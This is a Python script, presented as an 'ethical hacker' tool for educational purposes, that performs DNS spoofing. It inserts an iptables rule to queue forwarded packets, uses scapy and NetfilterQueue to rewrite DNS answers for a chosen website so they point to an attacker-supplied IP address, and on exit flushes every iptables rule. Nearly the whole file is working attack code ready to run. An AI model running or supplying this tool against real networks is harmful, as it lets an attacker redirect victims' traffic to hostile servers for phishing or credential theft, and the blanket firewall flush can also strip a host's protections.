#!/usr/bin/env python3

# DNS Spoofing Script
# Coded by Pakistani Ethical Hacker Mr. Sabaz Ali Khan
# For Educational Purposes Only - Use Responsibly
# Contact: Sabazali236@gmail.com

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os
import argparse

# Function to parse command-line arguments
def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofing Script by Mr. Sabaz Ali Khan")
    parser.add_argument('-t', '--target', dest="target_website", help="Target website to spoof (e.g., www.example.com)")
    parser.add_argument('-d', '--destination', dest="destination_ip", help="Destination IP to redirect to (e.g., 192.168.1.100)")
    options = parser.parse_args()
    if not options.target_website:
        parser.error("[-] Please specify the target website, use --help for more info")
    if not options.destination_ip:
        parser.error("[-] Please specify the destination IP, use --help for more info")
    return options

# Function to process intercepted packets
def process_packet(packet):
    try:
        # Convert packet to Scapy packet
        scapy_packet = scapy.IP(packet.get_payload())
        
        # Check if the packet has a DNS query
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname.decode()
            
            # Check if the target website is in the query
            if target_website in qname:
                print(f"[+] Spoofing DNS response for {qname}")
                
                # Craft a fake DNS response
                dns_answer = scapy.DNSRR(
                    rrname=qname,
                    ttl=300,
                    type="A",
                    rclass="IN",
                    rdata=destination_ip
                )
                
                # Modify the packet
                scapy_packet[scapy.DNS].an = dns_answer
                scapy_packet[scapy.DNS].ancount = 1
                
                # Delete checksums to allow Scapy to recalculate them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                # Set the modified packet payload
                packet.set_payload(bytes(scapy_packet))
        
        # Accept the packet
        packet.accept()
        
    except Exception as e:
        print(f"[-] Error processing packet: {e}")
        packet.drop()

def main():
    global target_website, destination_ip
    
    # Get command-line arguments
    options = get_arguments()
    target_website = options.target_website
    destination_ip = options.destination_ip
    
    print(f"[*] Starting DNS Spoofing by Mr. Sabaz Ali Khan")
    print(f"[*] Target Website: {target_website}")
    print(f"[*] Destination IP: {destination_ip}")
    
    # Set up iptables to queue packets
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    print("[*] iptables rule set to queue packets")
    
    try:
        # Bind to NetfilterQueue
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        print("[*] Starting packet interception...")
        queue.run()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping DNS Spoofing...")
        # Clean up iptables
        os.system("iptables --flush")
        print("[*] iptables flushed")
        queue.unbind()
        print("[*] Script terminated by Mr. Sabaz Ali Khan")

if __name__ == "__main__":
    main()